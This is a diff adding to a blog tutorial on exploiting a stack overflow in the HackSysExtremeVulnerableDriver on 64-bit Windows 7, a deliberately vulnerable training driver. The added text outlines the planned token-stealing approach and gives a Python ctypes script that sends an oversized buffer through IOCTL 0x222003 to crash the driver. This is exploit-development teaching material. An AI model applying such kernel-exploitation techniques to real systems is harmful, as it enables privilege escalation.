@@ -44,4 +44,68 @@ I used the following blogs as references:
 There are probably some I even forgot. Huge thanks to the blog authors, no way I could've finished these first two exploits without your help/wisdom. 
 
 ## Goal
-We just knocked out the Win7 x86 exploit last post, let's get the Win7 x86-64 exploit completed now.  
+We just knocked out the Win7 x86 exploit last post, let's get the Win7 x86-64 exploit completed now. We won't be going over most of the things we already covered in the last post. 
+
+We will use a lot of the same approaches from last post with a few changes. Those changes will be:
++ Let's use `VirtualAlloc` instead of `VirtualProtect` this time,
++ We will need to change our script in certain places to work with 64 bit registers,
++ A new token-stealing shellcode provided by @abatchy17,
++ New kernel execution restoration shellcode, and
++ A new `ctypes` function or two.
+
+Let's get started.
+
+## Getting a 64-bit Crash!
+We will once again use the `0x222003` IOCTL to reach our desired function `TriggerStackOverflow`, and the `CreateFileA` API will look exactly the same. This will once again return a handle to our device driver. Let's use the handle to call `DeviceIoControl` and get a crash by sending a large buffer. 
+
+To create the buffer, we will use the awesome `ctypes` function `create_string_buffer` which I learned from @sizzop's awesome blog posts on this subject. (In the last post we leaned heavily on @r0otki7, in this one, I leaned heavily on @sizzop.) 
+
+We will start by sending a buffer of 3,000 `"A"`, just like last time and we should get a crash. Right now our code looks like this: 
+```python
+import ctypes, sys, struct
+from ctypes import *
+from subprocess import *
+import time
+
+kernel32 = windll.kernel32
+
+hevd = kernel32.CreateFileA(
+        "\\\\.\\HackSysExtremeVulnerableDriver", 
+        0xC0000000, 
+        0, 
+        None, 
+        0x3, 
+        0, 
+        None)
+    
+if (not hevd) or (hevd == -1):
+    print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
+    sys.exit(1)
+else:
+    print("[*] Successfully retrieved handle to device-driver: " + str(hevd))
+
+buf = create_string_buffer("A"*3000)
+
+result = kernel32.DeviceIoControl(
+    hevd,
+    0x222003,
+    addressof(buf),
+    (len(buf)-1),
+    None,
+    0,
+    byref(c_ulong()),
+    None
+)
+
+if result != 0:
+        print("[*] Sending payload to driver...")
+else:
+    print("[!] Unable to send payload to driver.")
+    sys.exit(1)
+```
+
+A tricky thing here is that when you `create_string_buffer`, your buffer is null terminated. Meaning it's one byte longer than the length we specified. This one is 3001 bytes long. You'll notice in `DeviceIoControl`, we subtracted one from the length of the buffer we want to send for this reason. (Thank you HEVD devs for including debug statements that include the length of the User Buffer!)
+
+Running this on the victim should get us a crash. 
+
+
